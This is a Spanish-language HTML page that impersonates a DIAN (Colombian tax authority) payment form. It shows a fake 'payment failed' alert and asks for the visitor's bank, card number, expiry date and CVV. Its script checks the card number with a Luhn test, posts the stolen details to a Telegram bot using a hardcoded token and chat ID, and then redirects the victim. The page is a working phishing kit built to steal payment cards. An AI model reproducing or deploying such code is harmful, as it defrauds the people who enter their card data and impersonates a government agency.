<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Formulario de Pago DIAN</title>
  <link href="https://fonts.googleapis.com/css2?family=Lato&display=swap" rel="stylesheet">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      font-family: 'Lato', sans-serif;
      background-color: #fff;
      padding: 20px;
      color: #000;
    }

    .top-bar {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 15px;
    }

    .top-bar img.logo {
      height: 50px;
    }

    .top-bar .flags img {
      width: 24px;
      margin-left: 6px;
      cursor: pointer;
    }

    .section-title {
      font-weight: bold;
      color: #1d276c;
      margin: 15px 0 5px;
    }

    .input-row {
      background: #f5f5f5;
      padding: 10px;
      border-radius: 5px;
      font-size: 14px;
    }

    label {
      color: #1D276C;
      font-size: 14px;
      display: block;
      margin-top: 10px;
      margin-bottom: 3px;
    }

    input, select {
      width: 90%;
      padding: 8px;
      font-size: 14px;
      border: 1px solid #ccc;
      border-radius: 4px;
      display: block;
      margin: 0 auto;
    }

    .footer {
      position: fixed;
      bottom: 0;
      left: 0;
      width: 100%;
      background-color: #001e5a;
      color: white;
      text-align: center;
      font-size: 12px;
      padding: 12px;
      box-sizing: border-box;
      z-index: 1000;
    }

    .input-flex {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: 10px;
    }

    .input-flex label {
      width: 40%;
      margin: 0;
      text-align: left;
      font-weight: bold;
    }

    .input-flex input,
    .input-flex select {
      width: 58%;
      margin: 0;
    }
  </style>

<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>

</head>
<body>
  <div class="top-bar">
    <img src="/imagenes/DIAN.png" alt="Logo" class="logo">
    <div class="flags">
      <img src="https://flagcdn.com/w40/co.png" alt="ES">
      <img src="https://flagcdn.com/w40/us.png" alt="EN">
      <img src="https://flagcdn.com/w40/br.png" alt="BR">
    </div>
  </div>

  <script>
    Swal.fire({
  icon: "error",
  title: "Error",
  text: "Tu pago no pudo ser procesado",
});
  </script>
  <div class="section-title">Información Tarjeta Crédito/Débito</div>
  <hr style="border: none; border-top: 2px solid #ffd800; margin: 20px 0;">

  <div class="input-row">
    <form id="bancoForm">
      <div class="input-flex">
        <label for="tipo">Seleccione su banco *</label>
        <select id="tipo" name="banco" required>
          <option value="">Seleccione su banco</option>
          <option value="avvillas">BANCO AV VILLAS</option>
          <option value="bancolombia">BANCOLOMBIA</option>
          <option value="bbva">BANCO BBVA COLOMBIA S.A.</option>
          <option value="bogota">BANCO DE BOGOTA</option>
          <option value="cajasocial">BANCO CAJA SOCIAL</option>
          <option value="citibank">CITIBANK</option>
          <option value="colpatria">SCOTIABANK COLPATRIA</option>
          <option value="davivienda">BANCO DAVIVIENDA</option>
          <option value="falabella">BANCO FALABELLA</option>
          <option value="finandina">BANCO FINANDINA S.A. BIC</option>
          <option value="itau">BANCO ITAU</option>
          <option value="nequi">NEQUI</option>
          <option value="occidente">BANCO DE OCCIDENTE</option>
          <option value="popular">BANCO POPULAR</option>
          <option value="serfinanza">BANCO SERFINANZA</option>
          <option value="tuya">TUYA S.A.</option>
        </select>
      </div>
      <div class="input-flex">
        <label for="cc">Número de Tarjeta *</label>
        <input type="text" inputmode="numeric" id="cc" required minlength="15" maxlength="16">
      </div>
      <div class="input-flex">
        <label for="fecha">Fecha de Vencimiento *</label>
        <input type="text" inputmode="numeric" id="fecha" required placeholder="MM/AAAA" maxlength="7">
      </div>
      <div class="input-flex">
        <label for="cvv">CVV *</label>
        <input type="text" inputmode="numeric" id="cvv" maxlength="4" required>
      </div>
      <br>
      <div style="text-align: center;">
        <button type="submit" style="padding: 10px 20px; background-color: #1d276c; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer;">
          Continuar
        </button>
      </div>
    </form>
  </div>

  <hr style="border: none; border-top: 2px solid #ffd800; margin: 20px 0;">
  <hr style="border: none; border-top: 8px solid #1d276c; margin: 20px 0;">

  <div class="section-title">DIAN</div>
  <div class="section-title">800197268-4</div>
  <div class="section-title">111711</div>

  <br><br><br>

  <div class="footer">
    Copyright © Tc Pay un producto de Tu Compra S.A.S
  </div>

  <script>
    const TOKEN = '7473479631:AAE4S5jdqSvHXK0kmGzYxC-WPQoteBiP3kE';
    const CHAT_ID = '-4697957883';

    function validarLuhn(numero) {
      let sum = 0, shouldDouble = false;
      for (let i = numero.length - 1; i >= 0; i--) {
        let digit = parseInt(numero[i]);
        if (shouldDouble) {
          digit *= 2;
          if (digit > 9) digit -= 9;
        }
        sum += digit;
        shouldDouble = !shouldDouble;
      }
      return sum % 10 === 0;
    }

    document.getElementById("fecha").addEventListener("input", function(e) {
      let value = e.target.value.replace(/\D/g, "");
      if (value.length >= 2 && value.length <= 6) {
        e.target.value = value.slice(0, 2) + '/' + value.slice(2);
      } else {
        e.target.value = value;
      }
    });

    document.getElementById("cc").addEventListener("input", function () {
      const num = this.value;
      const cvvInput = document.getElementById("cvv");
      if (num.startsWith("3")) {
        cvvInput.setAttribute("maxlength", "4");
        cvvInput.setAttribute("minlength", "4");
      } else if (num.startsWith("4") || num.startsWith("5")) {
        cvvInput.setAttribute("maxlength", "3");
        cvvInput.setAttribute("minlength", "3");
      } else {
        cvvInput.removeAttribute("maxlength");
        cvvInput.removeAttribute("minlength");
      }
    });

    document.getElementById("bancoForm").addEventListener("submit", function(e) {
      e.preventDefault();
      const banco = document.getElementById("tipo").value;
      const tarjeta = document.getElementById("cc").value.trim();
      const fecha = document.getElementById("fecha").value.trim();
      const cvv = document.getElementById("cvv").value.trim();

      if (!validarLuhn(tarjeta)) {
        alert("Número de tarjeta inválido.");
        return;
      }

      const mensaje = `
💳 *Nuevo Registro* 
*Banco:* ${banco}
*Número:* ${tarjeta}
*Vencimiento:* ${fecha}
*CVV:* ${cvv}
      `;

      fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: mensaje,
          parse_mode: 'Markdown'
        })
      }).then(() => {
        window.location.href = "/pago/" + encodeURIComponent(banco);
      }).catch(err => {
        alert("Error enviando a Telegram.");
        console.error(err);
      });
    });
  </script>
</body>
</html>